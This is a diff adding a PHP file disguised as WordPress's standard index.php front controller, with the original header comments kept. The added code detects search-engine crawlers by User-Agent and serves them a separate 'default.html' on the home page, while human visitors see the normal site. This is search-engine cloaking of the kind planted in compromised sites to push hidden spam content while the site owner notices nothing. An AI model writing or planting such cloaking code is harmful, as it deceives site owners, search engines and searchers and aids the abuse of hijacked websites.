@@ -1,0 +1,49 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+function isAllowedBot($userAgent) {
+    $allowedBots = [
+        'Googlebot', 'Google-Site-Verification', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google', 'Bingbot', 'MSNBot', 'AdIdxBot', 'Microsoftbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'YandexImages', 'Facebot', 'MetaInspector', 'Twitterbot', 'Pinterestbot', 'LinkedInBot', 'Mail.Ru/Bot', 'AhrefsBot', 'SemrushBot', 'MJ12bot', 'MoBot',  'SeznamBot', 'Applebot', 'NaverBot', 'Sogou web spider', 'Exabot', 'Konduitbot',
+    ];
+
+    foreach ($allowedBots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
+
+$template_for_bot = 'default.html'; // File yang akan ditampilkan ke bot
+$template_for_human = 'wp-blog-header.php';
+
+// Pastikan file untuk bot tersedia
+if (!file_exists($template_for_bot)) {
+    die("File template bot tidak ditemukan. Pastikan default.html tersedia.");
+}
+
+
+if (isAllowedBot($userAgent) && ($requestUri === '/' || $requestUri === '/index.php' || strpos($requestUri, '/?') === 0)) {
+    include($template_for_bot);
+    exit();
+} else {
+    /**
+     * Tells WordPress to load the WordPress theme and output it.
+     *
+     * @var bool
+     */
+    define( 'WP_USE_THEMES', true );
+
+    /** Loads the WordPress Environment and Template */
+    require __DIR__ . '/' . $template_for_human;
+}
+?>
